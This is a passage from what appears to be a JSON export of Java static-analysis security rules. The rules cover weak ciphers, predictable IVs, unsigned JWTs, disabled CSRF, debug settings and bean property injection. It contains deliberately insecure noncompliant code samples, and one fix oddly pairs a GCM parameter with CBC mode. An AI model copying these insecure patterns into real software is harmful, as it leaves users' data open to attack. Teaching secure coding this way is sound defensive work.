discovered by anyone who has access to the code, such as other developers or\n  attackers. This can lead to unauthorized access to the database and potential data breaches. </li>\n  <li> Lack of Flexibility: Hard-coded passwords make it difficult to change the password without modifying the code. If the password needs to be\n  updated, it would require recompiling and redeploying the code, which can be time-consuming and error-prone. </li>\n  <li> Version Control Issues: Storing passwords in code can lead to version control issues. If the code is shared or stored in a version control\n  system, the password will be visible to anyone with access to the repository, which is a security risk. </li>\n</ol>\n<p>To mitigate these risks, it is recommended to use secure methods for storing and retrieving passwords, such as using environment variables,\nconfiguration files, or secure key management systems. These methods allow for better security, flexibility, and separation of sensitive information\nfrom the codebase.</p>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/essential/environment/properties.html\">Java Properties</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/521\">CWE-521 - Weak Password Requirements</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "java:S3329": {
        "name": "Cipher Block Chaining IVs should be unpredictable",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In the mode Cipher Block Chaining (CBC), each block is used as cryptographic input for the next block. For this reason, the first block requires an\ninitialization vector (IV), also called a \"starting variable\" (SV).</p>\n<p>If the same IV is used for multiple encryption sessions or messages, each new encryption of the same plaintext input would always produce the same\nciphertext output. This may allow an attacker to detect patterns in the ciphertext.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, a company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Java Cryptography Extension</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport java.nio.charset.StandardCharsets;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.InvalidKeyException;\nimport java.security.InvalidAlgorithmParameterException;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.GCMParameterSpec;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.crypto.NoSuchPaddingException;\n\npublic void encrypt(String key, String plainText) {\n\n    byte[] RandomBytes = \"7cVgr5cbdCZVw5WY\".getBytes(StandardCharsets.UTF_8);\n\n    GCMParameterSpec iv   = new GCMParameterSpec(128, RandomBytes);\n    SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), \"AES\");\n\n    try {\n        Cipher cipher = Cipher.getInstance(\"AES/CBC/NoPadding\");\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv); // Noncompliant\n\n    } catch(NoSuchAlgorithmException|InvalidKeyException|\n            NoSuchPaddingException|InvalidAlgorithmParameterException e) {\n        // ...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>In this example, the code explicitly uses a number generator that is considered <strong>strong</strong>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.nio.charset.StandardCharsets;\nimport java.security.SecureRandom;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.InvalidKeyException;\nimport java.security.InvalidAlgorithmParameterException;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.GCMParameterSpec;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.crypto.NoSuchPaddingException;\n\npublic void encrypt(String key, String plainText) {\n\n    SecureRandom random = new SecureRandom();\n    byte[] randomBytes  = new byte[16];\n    random.nextBytes(randomBytes);\n\n    GCMParameterSpec iv   = new GCMParameterSpec(128, randomBytes);\n    SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), \"AES\");\n\n    try {\n        Cipher cipher = Cipher.getInstance(\"AES/CBC/NoPadding\");\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv);\n\n    } catch(NoSuchAlgorithmException|InvalidKeyException|\n            NoSuchPaddingException|InvalidAlgorithmParameterException e) {\n        // ...\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use unique IVs</h4>\n<p>To ensure high security, initialization vectors must meet two important criteria:</p>\n<ul>\n  <li> IVs must be unique for each encryption operation. </li>\n  <li> For CBC and CFB modes, a secure FIPS-compliant random number generator should be used to generate unpredictable IVs. </li>\n</ul>\n<p>The IV does not need be secret, so the IV or information sufficient to determine the IV may be transmitted along with the ciphertext.</p>\n<p>In the previous non-compliant example, the problem is not that the IV is hard-coded.<br> It is that the same IV is used for multiple encryption\nattempts.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/329\">CWE-329 - Not Using an Unpredictable IV with CBC Mode</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/780\">CWE-780 - Use of RSA Algorithm without OAEP</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf\">NIST, SP-800-38A</a> - Recommendation for Block Cipher\n  Modes of Operation </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S4502": {
        "name": "Disabling CSRF protections is security-sensitive",
        "htmlDesc": "<p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive\nactions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the\napplication.</p>\n<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a\nhidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The web application uses cookies to authenticate users. </li>\n  <li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li>\n  <li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Protection against CSRF attacks is strongly recommended:\n    <ul>\n      <li> to be activated by default for all <a href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">unsafe HTTP\n      methods</a>. </li>\n      <li> implemented, for example, with an unguessable CSRF token </li>\n    </ul>  </li>\n  <li> Of course all sensitive operations should not be performed with <a\n  href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">safe HTTP</a> methods like <code>GET</code> which are designed to be\n  used only for information retrieval. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-using\">Spring Security</a> provides by default a\nprotection against CSRF attacks which can be disabled:</p>\n<pre>\n@EnableWebSecurity\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    http.csrf().disable(); // Sensitive: csrf protection is entirely disabled\n   // or\n    http.csrf().ignoringAntMatchers(\"/route/\"); // Sensitive: csrf protection is disabled for specific routes\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-using\">Spring Security</a> CSRF protection is enabled\nby default, do not disable it:</p>\n<pre>\n@EnableWebSecurity\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    // http.csrf().disable(); // Compliant\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/352\">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/csrf\">OWASP: Cross-Site Request Forgery</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S4507": {
        "name": "Delivering code in production with debug features activated is security-sensitive",
        "htmlDesc": "<p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during\ndevelopment, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information\nabout the system, like the application’s path or file names.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>\n  <li> The application runs by default with debug features activated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not enable debugging features on production servers or applications distributed to end users.</p>\n<h2>Sensitive Code Example</h2>\n<p><code>Throwable.printStackTrace(...)</code> prints a Throwable and its stack trace to <code>System.Err</code> (by default) which is not easily\nparseable and can expose sensitive information:</p>\n<pre>\ntry {\n  /* ... */\n} catch(Exception e) {\n  e.printStackTrace(); // Sensitive\n}\n</pre>\n<p><a\nhref=\"https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/EnableWebSecurity.html\">EnableWebSecurity</a>\nannotation for SpringFramework with <code>debug</code> to <code>true</code> enables debugging support:</p>\n<pre>\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\n\n@Configuration\n@EnableWebSecurity(debug = true) // Sensitive\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n  // ...\n}\n</pre>\n<p><a\nhref=\"https://developer.android.com/reference/android/webkit/WebView#setWebContentsDebuggingEnabled(boolean)\">WebView.setWebContentsDebuggingEnabled(true)</a>\nfor Android enables debugging support:</p>\n<pre>\nimport android.webkit.WebView;\n\nWebView.setWebContentsDebuggingEnabled(true); // Sensitive\nWebView.getFactory().getStatics().setWebContentsDebuggingEnabled(true); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Loggers should be used (instead of <code>printStackTrace</code>) to print throwables:</p>\n<pre>\ntry {\n  /* ... */\n} catch(Exception e) {\n  LOGGER.log(\"context\", e);\n}\n</pre>\n<p><a\nhref=\"https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/EnableWebSecurity.html\">EnableWebSecurity</a>\nannotation for SpringFramework with <code>debug</code> to <code>false</code> disables debugging support:</p>\n<pre>\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\n\n@Configuration\n@EnableWebSecurity(debug = false)\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n  // ...\n}\n</pre>\n<p><a\nhref=\"https://developer.android.com/reference/android/webkit/WebView#setWebContentsDebuggingEnabled(boolean)\">WebView.setWebContentsDebuggingEnabled(false)</a>\nfor Android disables debugging support:</p>\n<pre>\nimport android.webkit.WebView;\n\nWebView.setWebContentsDebuggingEnabled(false);\nWebView.getFactory().getStatics().setWebContentsDebuggingEnabled(false);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/489\">CWE-489 - Active Debug Code</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/215\">CWE-215 - Information Exposure Through Debug Information</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "java:S4512": {
        "name": "Setting JavaBean properties is security-sensitive",
        "htmlDesc": "<p>Setting JavaBean properties is security sensitive. Doing it with untrusted values has led in the past to the following vulnerability:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0114\">CVE-2014-0114</a> </li>\n</ul>\n<p>JavaBeans can have their properties or nested properties set by population functions. An attacker can leverage this feature to push into the\nJavaBean malicious data that can compromise the software integrity. A typical attack will try to manipulate the ClassLoader and finally execute\nmalicious code.</p>\n<p>This rule raises an issue when:</p>\n<ul>\n  <li> BeanUtils.populate(…​) or BeanUtilsBean.populate(…​) from <a href=\"http://commons.apache.org/proper/commons-beanutils/\">Apache Commons\n  BeanUtils</a> are called </li>\n  <li> BeanUtils.setProperty(…​) or BeanUtilsBean.setProperty(…​) from <a href=\"http://commons.apache.org/proper/commons-beanutils/\">Apache Commons\n  BeanUtils</a> are called </li>\n  <li> org.springframework.beans.BeanWrapper.setPropertyValue(…​) or org.springframework.beans.BeanWrapper.setPropertyValues(…​) from Spring is called\n  </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the new property values might have been tampered with or provided by an untrusted source. </li>\n  <li> sensitive properties can be modified, for example: <code>class.classLoader</code> </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Sanitize all values used as JavaBean properties.</p>\n<p>Don’t set any sensitive properties. Keep full control over which properties are set. If the property names are provided by an unstrusted source,\nfilter them with a whitelist.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nCompany bean = new Company();\nHashMap map = new HashMap();\nEnumeration names = request.getParameterNames();\nwhile (names.hasMoreElements()) {\n    String name = (String) names.nextElement();\n    map.put(name, request.getParameterValues(name));\n}\nBeanUtils.populate(bean, map); // Sensitive: \"map\" is populated with data coming from user input, here \"request.getParameterNames()\"\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/915\">CWE-915 - Improperly Controlled Modification of Dynamically-Determined Object\n  Attributes</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#BEAN_PROPERTY_INJECTION\">BEAN_PROPERTY_INJECTION</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S5659": {
        "name": "JWT should be signed and verified with strong cipher algorithms",
        "htmlDesc": "<p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>\n<h2>Why is this an issue?</h2>\n<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security\nrisk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This\nvulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT\nhinges on the strength and presence of its signature.</p>\n<h3>What is the potential impact?</h3>\n<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant\nthreat to data security and the privacy of user identities.</p>\n<h4>Impersonation of users</h4>\n<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.\nWhen these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to\ncraft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level\npermissions and sensitive data.</p>\n<h4>Unauthorized data access</h4>\n<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker\ncan manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>\n<h2>How to fix it in Java JWT</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of JWT encoding and decoding without a strong cipher algorithm.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nimport io.jsonwebtoken.Jwts;\n\npublic void encode() {\n    Jwts.builder()\n        .setSubject(USER_LOGIN)\n        .compact(); // Noncompliant\n}\n</pre>\n<pre data-diff-id=\"12\" data-diff-type=\"noncompliant\">\nimport io.jsonwebtoken.Jwts;\n\npublic void decode() {\n    Jwts.parser()\n        .setSigningKey(SECRET_KEY)\n        .parse(token)\n        .getBody(); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nimport io.jsonwebtoken.Jwts;\n\npublic void encode() {\n    Jwts.builder()\n        .setSubject(USER_LOGIN)\n        .signWith(SignatureAlgorithm.HS256, SECRET_KEY)\n        .compact();\n}\n</pre>\n<p>When using <code>Jwts.parser()</code>, make sure to call <code>parseClaimsJws</code> instead of <code>parse</code> as it throws exceptions for\ninvalid or missing signatures.</p>\n<pre data-diff-id=\"12\" data-diff-type=\"compliant\">\nimport io.jsonwebtoken.Jwts;\n\npublic void decode() {\n    Jwts.parser()\n        .setSigningKey(SECRET_KEY)\n        .parseClaimsJws(token)\n        .getBody();\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Always sign your tokens</h4>\n<p>The foremost measure to enhance JWT security is to ensure that every JWT you issue is signed. Unsigned tokens are like open books that anyone can\ntamper with. Signing your JWTs ensures that any alterations to the tokens after they have been issued can be detected. Most JWT libraries support a\nsigning function, and using it is usually as simple as providing a secret key when the token is created.</p>\n<h4>Choose a strong cipher algorithm</h4>\n<p>It is not enough to merely sign your tokens. You need to sign them with a strong cipher algorithm. Algorithms like HS256 (HMAC using SHA-256) are\nconsidered secure for most purposes. But for an additional layer of security, you could use an algorithm like RS256 (RSA Signature with SHA-256),\nwhich uses a private key for signing and a public key for verification. This way, even if someone gains access to the public key, they will not be\nable to forge tokens.</p>\n<h4>Verify the signature of your tokens</h4>\n<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:\nvalidating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating\nsignatures, they are not serving their purpose.</p>\n<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding\nprocess that the signature of the JWT should also be checked.</p>\n<p>To resolve the issue, follow these instructions:</p>\n<ol>\n  <li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not\n  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li>\n  <li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating\n  potential tampering. The action to take when encountering an invalid token should be denying the request carrying it and logging the event for\n  further investigation. </li>\n  <li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature\n  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li>\n</ol>\n<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on\ntampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>\n<h3>Going the extra mile</h3>\n<h4>Securely store your secret keys</h4>\n<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control\nsystem. Instead, consider using environment variables, secure key management systems, or vault services.</p>\n<h4>Rotate your secret keys</h4>\n<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to\nperiodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be\nsure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/347\">CWE-347 - Improper Verification of Cryptographic Signature</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S5547": {
        "name": "Cipher algorithms should be robust",
        "htmlDesc": "<p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for\nseveral important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Java Cryptography Extension</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.crypto.Cipher;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic static void main(String[] args) {\n    try {\n        Cipher des = Cipher.getInstance(\"DES\"); // Noncompliant\n    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {\n        // ...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.crypto.Cipher;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic static void main(String[] args) {\n    try {\n        Cipher aes = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {\n        // ...\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use a secure algorithm</h4>\n<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an\nalgorithm is the Advanced Encryption Standard (AES).</p>\n<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S5542": {
        "name": "Encryption algorithms should be used with secure mode and padding scheme",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and\nreducing the difficulty of recovering the original cleartext.</p>\n<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used\nwith caution.</p>\n<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Java Cryptography Extension</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Example with a symmetric cipher, AES:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.crypto.Cipher;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic static void main(String[] args) {\n    try {\n        Cipher.getInstance(\"AES/CBC/PKCS5Padding\"); // Noncompliant\n    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {\n        // ...\n    }\n}\n</pre>\n<p>Example with an asymmetric cipher, RSA:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nimport javax.crypto.Cipher;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic static void main(String[] args) {\n    try {\n        Cipher.getInstance(\"RSA/None/NoPadding\"); // Noncompliant\n    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {\n        // ...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>For the AES symmetric cipher, use the GCM 